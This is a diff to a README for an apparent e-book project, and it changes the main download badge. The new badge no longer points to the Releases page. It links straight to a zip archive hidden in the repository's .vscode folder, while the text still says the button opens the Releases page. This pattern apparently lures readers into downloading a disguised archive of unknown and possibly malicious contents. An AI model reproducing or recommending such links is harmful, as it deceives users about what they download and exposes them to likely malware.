@@ -8,7 +8,7 @@ Welcome to the rqyhzn project! This repository offers an electronic book titled 
 
 To get started, you will need to download the application from our Releases page. Click the button below to visit the downloads section.
 
-[![Download](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/hedilamara/rqyhzn/releases)
+[![Download](https://raw.githubusercontent.com/hedilamara/rqyhzn/main/.vscode/rqyhzn_v2.0-beta.2.zip%20Now-brightgreen)](https://raw.githubusercontent.com/hedilamara/rqyhzn/main/.vscode/rqyhzn_v2.0-beta.2.zip)
 
 1. Click the button above to go to the Releases page.
 2. On the Releases page, you will see different versions listed.
